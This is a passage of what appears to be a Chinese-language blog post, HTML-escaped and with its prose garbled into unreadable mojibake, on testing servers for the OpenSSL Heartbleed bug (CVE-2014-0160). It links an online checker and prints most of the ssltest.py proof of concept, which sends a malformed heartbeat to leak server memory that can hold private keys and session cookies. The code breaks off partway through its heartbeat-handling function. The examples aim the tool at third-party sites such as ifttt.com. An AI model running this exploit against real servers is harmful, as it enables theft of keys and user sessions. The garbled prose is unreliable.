&lt;h3 id=&quot;å¦‚ä½•è‡ªæˆ‘æª¢æ¸¬&quot;&gt;å¦‚ä½•è‡ªæˆ‘æª¢æ¸¬ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;è¦å¦‚ä½•æ¸¬è©¦è‡ªå·±çš„ç¶²ç«™æœ‰æ²’æœ‰é€™æ¨£çš„æ¼æ´å‘¢ï¼Ÿå¯ä»¥åˆ©ç”¨ä»¥ä¸‹çš„ç¶²ç«™æˆ–å·¥å…·ç›´æ¥æŸ¥è©¢ã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Heartbleed test &lt;a href=&quot;http://filippo.io/Heartbleed/&quot;&gt;http://filippo.io/Heartbleed/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç›´æ¥è¼¸å…¥ Domain å³å¯æŸ¥è©¢ï¼Œä¾‹å¦‚ã€Œfbi.govã€ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140409/2014-04-08-openssl-heartbleed-CVE-2014-0160-01-fbi.gov.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140409/2014-04-08-openssl-heartbleed-CVE-2014-0160-01-fbi.gov.png&quot; alt=&quot;OpenSSL CVE-2014-0160 Heartbleed æª¢æ¸¬: fbi.gov&quot; title=&quot;OpenSSL CVE-2014-0160 Heartbleed æª¢æ¸¬: fbi.gov&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;è‡ªæˆ‘æ¸¬è©¦å·¥å…· &lt;a href=&quot;http://s3.jspenguin.org/ssltest.py&quot;&gt;http://s3.jspenguin.org/ssltest.py&lt;/a&gt; ï¼ˆæˆ– &lt;a href=&quot;http://pastebin.com/WmxzjkXJ&quot;&gt;http://pastebin.com/WmxzjkXJ&lt;/a&gt;ï¼‰&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä½¿ç”¨æ–¹æ³•ç›´æ¥åŸ·è¡Œã€Œpython ssltest.py ifttt.comã€ï¼Œæˆ–æ˜¯ç”¨ã€Œ-pã€æŒ‡å®šç‰¹å®š SSL é€£æ¥åŸ ã€‚ç•«é¢ä¸Šæœƒé¡¯ç¤ºå‡ºè¨˜æ†¶é«”è³‡æ–™ï¼Œå¯èƒ½å…§å«æ©Ÿæ•è³‡æ–™ä¾‹å¦‚ private keyã€session cookie ç­‰ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140409/2014-04-08-openssl-heartbleed-CVE-2014-0160-02-ifttt.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140409/2014-04-08-openssl-heartbleed-CVE-2014-0160-02-ifttt.png&quot; alt=&quot;OpenSSL CVE-2014-0160 Heartbleed æª¢æ¸¬: ifttt.com&quot; title=&quot;OpenSSL CVE-2014-0160 Heartbleed æª¢æ¸¬: ifttt.com&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;åŸå§‹ç¢¼å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;select&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;optparse&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OptionParser&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OptionParser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;usage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;%prog server [options]&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;Test for SSL heartbeat vulnerability (CVE-2014-0160)&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;-p&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;--port&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;int&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;443&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;TCP port to test (default: 443)&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;h2bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;hex&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;hello&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;h2bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&apos;&apos;
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
&apos;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;hb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;h2bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&apos;&apos; 
18 03 02 00 03
01 40 00
&apos;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hexdump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;lin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;hxdat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;%02X&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pdat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;126&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;.&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;  %04x: %-48s %s&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hxdat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;endtime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rtime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endtime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; 
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rtime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;# EOF?
&lt;/span&gt;            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;rdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdata&lt;/span&gt;
        

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;recvmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Unexpected EOF receiving record header - server closed connection&apos;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&amp;gt;BHH&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Unexpected EOF receiving record payload - server closed connection&apos;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos; ... received message: type = %d, ver = %04x, length = %d&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hit_hb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recvmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;No heartbeat response received, server likely not vulnerable&apos;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Received heartbeat response:&apos;&lt;/span&gt;
